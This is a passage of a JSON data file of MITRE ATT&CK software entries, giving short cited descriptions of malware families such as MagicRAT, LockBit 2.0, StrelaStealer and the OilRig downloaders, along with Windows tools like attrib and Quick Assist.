    "description": "[Sagerunex](https://attack.mitre.org/software/S1210) is a malware family exclusively associated with [Lotus Blossom](https://attack.mitre.org/groups/G0030) operations, with variants existing since at least 2016. Variations of [Sagerunex](https://attack.mitre.org/software/S1210) leverage non-traditional command and control mechanisms such as various web services.(Citation: Symantec Bilbug 2022)(Citation: Cisco LotusBlossom 2025)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "Sagerunex"
    ],
    "id": "S1210"
  },
  "malware--858b0f9d-3a2a-437e-a058-afe72154f6da": {
    "name": "MagicRAT",
    "description": "[MagicRAT](https://attack.mitre.org/software/S1182) is a remote access tool developed in C++ and exclusively used by the [Lazarus Group](https://attack.mitre.org/groups/G0032) threat actor in operations. [MagicRAT](https://attack.mitre.org/software/S1182) allows for arbitrary command execution on victim machines and provides basic remote access functionality.(Citation: Cisco MagicRAT 2022)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "MagicRAT"
    ],
    "id": "S1182"
  },
  "malware--929d0d4d-b7c6-4ee8-81eb-43c849294e27": {
    "name": "Akira _v2",
    "description": "[Akira _v2](https://attack.mitre.org/software/S1194) is a Rust-based variant of [Akira](https://attack.mitre.org/software/S1129) ransomware that has been in use since at least 2024. [Akira _v2](https://attack.mitre.org/software/S1194) is designed to target VMware ESXi servers and includes a new command-line argument set and other expanded capabilities.(Citation: CISA Akira Ransomware APR 2024)(Citation: Cisco Akira Ransomware OCT 2024)(Citation: Palo Alto Howling Scorpius DEC 2024)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "Akira _v2"
    ],
    "id": "S1194"
  },
  "malware--9454bb5d-3bdb-40f9-a878-b5fb446ded3d": {
    "name": "BlackByte Ransomware",
    "description": "[BlackByte Ransomware](https://attack.mitre.org/software/S1180) is uniquely associated with [BlackByte](https://attack.mitre.org/groups/G1043) operations. [BlackByte Ransomware](https://attack.mitre.org/software/S1180) used a common key for infections, allowing for the creation of a universal decryptor.(Citation: Trustwave BlackByte 2021)(Citation: FBI BlackByte 2022) [BlackByte Ransomware](https://attack.mitre.org/software/S1180) was replaced in [BlackByte](https://attack.mitre.org/groups/G1043) operations by [BlackByte 2.0 Ransomware](https://attack.mitre.org/software/S1181) by 2023.(Citation: Microsoft BlackByte 2023)(Citation: Cisco BlackByte 2024)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "BlackByte Ransomware"
    ],
    "id": "S1180"
  },
  "malware--951313b3-6064-4ce0-b4b6-a153c3973da7": {
    "name": "StrelaStealer",
    "description": "[StrelaStealer](https://attack.mitre.org/software/S1183) is an information stealer malware variant first identified in November 2022 and active through late 2024. [StrelaStealer](https://attack.mitre.org/software/S1183) focuses on the automated identification, collection, and exfiltration of email credentials from email clients such as Outlook and Thunderbird.(Citation: DCSO StrelaStealer 2022)(Citation: PaloAlto StrelaStealer 2024)(Citation: Fortgale StrelaStealer 2023)(Citation: IBM StrelaStealer 2024)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "StrelaStealer"
    ],
    "id": "S1183"
  },
  "malware--98943603-5be6-4551-8c98-bbaf0d229d39": {
    "name": "GoBear",
    "description": "[GoBear](https://attack.mitre.org/software/S1197) is a Go-based backdoor that abuses legitimate, stolen certificates for defense evasion purposes. [GoBear](https://attack.mitre.org/software/S1197) is exclusively linked to [Kimsuky](https://attack.mitre.org/groups/G0094) operations.(Citation: S2W Troll Stealer 2024)(Citation: Symantec Troll Stealer 2024)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "GoBear"
    ],
    "id": "S1197"
  },
  "malware--9c629607-03e4-4952-b481-2d54221d2783": {
    "name": "XLoader",
    "description": "[XLoader](https://attack.mitre.org/software/S1207) is an infostealer malware in use since at least 2016. Previously known and sometimes still referred to as Formbook, [XLoader](https://attack.mitre.org/software/S1207) is a Malware as a Service (MaaS) known for stealing data from web browsers, email clients and File Transfer Protocol (FTP) applications.(Citation: Zscaler XLoader 2025)(Citation: ANY.RUN XLoader 2023)(Citation: CheckPoint XLoader 2022)(Citation: Acronis XLoader 2021)(Citation: Google XLoader 2017)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "XLoader"
    ],
    "id": "S1207"
  },
  "malware--a43e55c9-0b7c-42c0-81de-b7a42d724db9": {
    "name": "Kapeka",
    "description": "Kapeka is a backdoor written in C++ used against victims in Eastern Europe since at least mid-2022. Kapeka has technical overlaps with [Exaramel for Windows](https://attack.mitre.org/software/S0343) and [Prestige](https://attack.mitre.org/software/S1058) malware variants, both of which are linked to [Sandworm Team](https://attack.mitre.org/groups/G0034). Kapeka may have been used in advance of [Prestige](https://attack.mitre.org/software/S1058) deployment in late 2022.(Citation: WithSecure Kapeka 2024)(Citation: Microsoft KnuckleTouch 2024)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "Kapeka"
    ],
    "id": "S1190"
  },
  "malware--a4578560-42cf-4075-9fa2-056f0058c881": {
    "name": "LockBit 2.0",
    "description": "[LockBit 2.0](https://attack.mitre.org/software/S1199) is an affiliate-based Ransomware-as-a-Service (RaaS) that has been in use since at least June 2021 as the successor to LockBit Ransomware. [LockBit 2.0](https://attack.mitre.org/software/S1199) has versions capable of infecting Windows and VMware ESXi virtual machines, and has been observed targeting multiple industry verticals globally.(Citation: FBI Lockbit 2.0 FEB 2022)(Citation: Palo Alto Lockbit 2.0 JUN 2022)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "LockBit 2.0"
    ],
    "id": "S1199"
  },
  "malware--a49725db-4a55-44cd-aefa-78b35d2d8641": {
    "name": "OilCheck",
    "description": "[OilCheck](https://attack.mitre.org/software/S1171) is a C#/.NET downloader that has been used by [OilRig](https://attack.mitre.org/groups/G0049) since at least 2022 including against targets in Israel. [OilCheck](https://attack.mitre.org/software/S1171) uses draft messages created in a shared email account for C2 communication.(Citation: ESET OilRig Downloaders DEC 2023)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "OilCheck"
    ],
    "id": "S1171"
  },
  "malware--a87c8100-8735-440e-8ee4-27aabb643592": {
    "name": "SampleCheck5000",
    "description": "[SampleCheck5000](https://attack.mitre.org/software/S1168) is a downloader with multiple variants that was used by [OilRig](https://attack.mitre.org/groups/G0049) including during the [Outer Space](https://attack.mitre.org/campaigns/C0042) campaign to download and execute additional payloads. (Citation: ESET OilRig Campaigns Sep 2023)(Citation: ESET OilRig Downloaders DEC 2023)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "SampleCheck5000"
    ],
    "id": "S1168"
  },
  "malware--b0381480-d5ba-4dd8-a39e-fb8f1afea3a0": {
    "name": "OilBooster",
    "description": "[OilBooster](https://attack.mitre.org/software/S1172) is a downloader written in Microsoft Visual C/C++ that has been used by [OilRig](https://attack.mitre.org/groups/G0049) since at least 2022 including against target organizations in Israel to download and execute files and for exfiltration.(Citation: ESET OilRig Downloaders DEC 2023)   ",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "OilBooster"
    ],
    "id": "S1172"
  },
  "malware--b921a2fa-09fe-46b8-bd3c-8118781bf1f8": {
    "name": "Solar",
    "description": "[Solar](https://attack.mitre.org/software/S1166) is a C#/.NET backdoor that was used by [OilRig](https://attack.mitre.org/groups/G0049) during the [Outer Space](https://attack.mitre.org/campaigns/C0042) campaign to download, execute, and exfiltrate files.(Citation: ESET OilRig Campaigns Sep 2023)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "Solar"
    ],
    "id": "S1166"
  },
  "malware--bae6edd1-eb36-4581-ba7e-6cbfe0e24eac": {
    "name": "Neo-reGeorg",
    "description": "[Neo-reGeorg](https://attack.mitre.org/software/S1189) is an open-source web shell designed as a restructuring of [reGeorg](https://attack.mitre.org/software/S1187) with improved usability, security, and fixes for exising [reGeorg](https://attack.mitre.org/software/S1187) bugs.(Citation: GitHub Neo-reGeorg 2019)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "Neo-reGeorg"
    ],
    "id": "S1189"
  },
  "malware--c5ec3344-e156-4b41-accb-274362e5dae8": {
    "name": "Mango",
    "description": "[Mango](https://attack.mitre.org/software/S1169) is a first-stage backdoor written in C#/.NET that was used by [OilRig](https://attack.mitre.org/groups/G0049) during the [Juicy Mix](https://attack.mitre.org/campaigns/C0044) campaign. [Mango](https://attack.mitre.org/software/S1169) is the successor to [Solar](https://attack.mitre.org/software/S1166) and includes additional exfiltration capabilities, the use of native APIs, and added detection evasion code.(Citation: ESET OilRig Campaigns Sep 2023)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "Mango"
    ],
    "id": "S1169"
  },
  "malware--cf8b27df-c494-4a0c-b093-556a80ad2bcf": {
    "name": "StealBit",
    "description": "[StealBit](https://attack.mitre.org/software/S1200) is a data exfiltration tool that is developed and maintained by the operators of the the LockBit Ransomware-as-a-Service (RaaS) and offered to affiliates to exfiltrate data from compromised systems for double extortion purposes.(Citation: Cybereason StealBit Exfiltration Tool)(Citation: FBI Lockbit 2.0 FEB 2022)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "StealBit"
    ],
    "id": "S1200"
  },
  "malware--d6748457-75c2-4989-a41f-2d017994057e": {
    "name": "Troll Stealer",
    "description": "[Troll Stealer](https://attack.mitre.org/software/S1196) is an information stealer written in Go associated with [Kimsuky](https://attack.mitre.org/groups/G0094) operations. [Troll Stealer](https://attack.mitre.org/software/S1196) has typically been delivered through a dropper disguised as a legitimate security program installation file. [Troll Stealer](https://attack.mitre.org/software/S1196) features code similar to [AppleSeed](https://attack.mitre.org/software/S0622), also uniquely associated with [Kimsuky](https://attack.mitre.org/groups/G0094) operations.(Citation: S2W Troll Stealer 2024)(Citation: Symantec Troll Stealer 2024)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "Troll Stealer"
    ],
    "id": "S1196"
  },
  "tool--8c6e9947-f7b1-4bd3-9d5d-cc7d39934989": {
    "name": "attrib",
    "description": "[attrib](https://attack.mitre.org/software/S1176) is a Windows utility used to display, set or remove attributes assigned to files or directories.(Citation: Microsoft attrib 2023) ",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "attrib"
    ],
    "id": "S1176"
  },
  "tool--da66959d-9875-4fde-bfed-11111a55895e": {
    "name": "cipher.exe",
    "description": "[cipher.exe](https://attack.mitre.org/software/S1205) is a native Microsoft utility that manages encryption of directories and files on NTFS (New Technology File System) partitions by using the Encrypting File System (EFS).(Citation: cipher.exe)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "cipher.exe"
    ],
    "id": "S1205"
  },
  "tool--fcdb30de-5449-4777-a4f4-922e71f65932": {
    "name": "Quick Assist",
    "description": "[Quick Assist](https://attack.mitre.org/software/S1209) is a remote assistance tool primarily for Microsoft Windows, although a macOS version also exists. [Quick Assist](https://attack.mitre.org/software/S1209) allows for remote screen sharing and, with end user approval, remote control and command execution on the enabling device.(Citation: Microsoft Storm-1811 2024)(Citation: Microsoft Quick Assist 2024)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "Quick Assist"
    ],
    "id": "S1209"
  }
}